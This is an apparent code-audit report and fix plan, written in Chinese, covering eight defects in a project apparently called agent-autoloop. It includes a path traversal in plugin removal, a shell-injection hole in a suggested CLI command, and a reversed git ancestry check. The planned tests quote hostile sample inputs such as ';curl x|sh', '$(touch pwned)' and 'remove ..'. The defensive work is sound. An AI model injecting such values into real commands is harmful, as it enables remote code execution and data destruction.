# 深度审计结论与修复计划

## Context

以架构师身份全量审了 kernel/host/worker/protocol/cli/plugins(我亲读内核全部 + 3 个并行 Explore 审计外围,每条发现都亲手读过代码或跑复现脚本核实)。基线健康:typecheck 过、test:quick 917 过 0 挂。架构本身纪律极强(纯内核、事实日志、单一写者、purity 测试),无结构性问题。以下 8 项是核实过的真实缺陷;另有 10 项记录不动(见末尾)。

## 必修(4 项,每项先写复现测试)

**1. `cli/plugins.ts:184` `plugins remove` 路径穿越**
`remove()` 对名字零校验就 `path.join(PLUGINS_DIR, name)` + `rmSync(recursive)`。`plugins remove ..` 删掉整个 AGENT_AUTOLOOP_HOME(hub.db、master.key、备份)。add/trust 都校验 `PLUGIN_NAME`,唯独 remove 没有。
修复:入口 `PLUGIN_NAME.test(name)` 不通过即 fail。测试(tests/plugins-cli.test.ts,子进程跑 CLI,home 是 mkdtemp 无危险):`remove ..` / `remove .` 后 home 仍在、退出码非 0。

**2. `cli/runs.ts:42` 翻页建议的 shell 注入**
`更早的：agent-autoloop runs <规则名> --before N` 里规则名白名单 `/^[^\s"'\\$`]+$/` 放行 `; | & ( ) < >`;兜底 `JSON.stringify` 的双引号在 sh/PowerShell 里 `$(...)` 照样展开。规则名无字符集限制,且 rules.json 常由 Agent 改。复制粘贴即执行。
修复:复用 `cli/status.ts:98` 的 `shellWord`(PLAIN 白名单 + 平台感知单引号转义,replayCommand 已在用),runs.ts 导入使用。测试(tests/cli-runs.test.ts):规则名带 `;curl x|sh` 与 `$(touch pwned)` 时输出不含裸名、含正确引号包裹。

**3. `plugins/delivery/gitlab.ts:174` isAncestor 参数颠倒**
`merge-base --is-ancestor head base` 问的是反问题。github.ts:290、project.ts:132/157、review.ts:78 四处都是 `base, head`,仅 gitlab 反的。后果:GitLab 交付上每次都白同步、15 分钟超时循环;合并后发布核实方向反——旧版本会被当"已发布",正是 Ship 核实要防的假发布。假 REST 测不出(假的 contains 是对的),所以活到现在。
修复:在 project.ts 导出单一 helper `isAncestor(root, base, head)`(spawnSync status,与现有两处内联同语义,顺带把那两处换成它);gitlab.ts 引用。测试(delivery 测试文件里,已有本地 `git init` 造仓先例):两提交仓库断言 `isAncestor(root, 旧, 新)===true`、`isAncestor(root, 新, 旧)===false`。

**4. `kernel/decide.ts:631` 卡片去向回读当前规则,违反协议"去向创建时定死"(已复现)**
实测:规则无 channels → ask 卡 → 规则后加 `channels:["feishu"]` → 原本该走默认全通道的卡被静默收窄(chat 领不到)。协议明文:"卡片创建时把去向写在卡片上,之后改规则不影响已经发出的卡片"。
修复(两半):
- `createCard`:无显式 routing 的中台通知,若带规则,创建时解析 `notices.channels ?? 规则当时的 channels ?? null` 冻结进卡片;`ask` handler(别处任务提问)补传 `routing: ruleRouting(draft, name)`,归入协议规定的 defaultChannels 桶(现状走 notices 桶,也是文档偏差)。
- `nextCard`:`card.channels ?? draft.rules.defaultChannels`,删掉对现行规则的回读。
既有 pinned 行为全保留:规则带列表的卡照旧只发列表;无规则的通知照旧全通道;#221 场景不变。测试(tests/cards.test.ts):复现脚本场景化——规则后加列表,chat 仍能领到创建前发的卡;文件头补失败模式一句。

## 应修(4 项,都是便宜且真实的;审批时可整组裁掉)

**5. `cli/update.ts:46` update.json 非原子写** — 写一半崩溃 → rollback 的 JSON.parse 抛 SyntaxError、回退通道砖死。改 tmp+rename(与 saveLock 同型)。复现测试难模拟崩溃,不单写测试,改法与 plugins-cli 已有原子写先例一致。
**6. `cli/plugins.ts` add 清理绕过** — try 内 `git()` 失败走 `fail()`→`process.exit`,catch 的回滚(删首装目录/切回旧版)永远到不了。try 内改用抛错的变体。测试(plugins-cli.test.ts):`--ref` 不存在的标签,断言失败后不留目录(现在留)。
**7. `host/backup.ts:215` replaced 为 null 时读 CWD 的 master.key** — `path.join("", "master.key")` 是相对路径,restore 到空 home 时 keyChanged 拿无关文件算。补 `replaced !== null` 判断。测试(backup.test.ts):chdir 到含不同 master.key 的目录再 restore 空 home,断言 keyChanged 不被 CWD 污染。
**8. `worker/worker.ts:320` start() 的 mkdir 在 try 外** — 本地磁盘满/权限失败会炸出 start,被 tick 的 catch 记成"连不上中台",10 分钟后误触发 unreachable 通知。包住:mkdir 失败记日志返回(活照协议走租约→unknown 兜底)。测试(worker.test.ts):chmod runs 目录 0o500(root 跳过)→ 给 job → 断言日志是本地错误而非 "couldn't reach the hub"、entries() 为空。
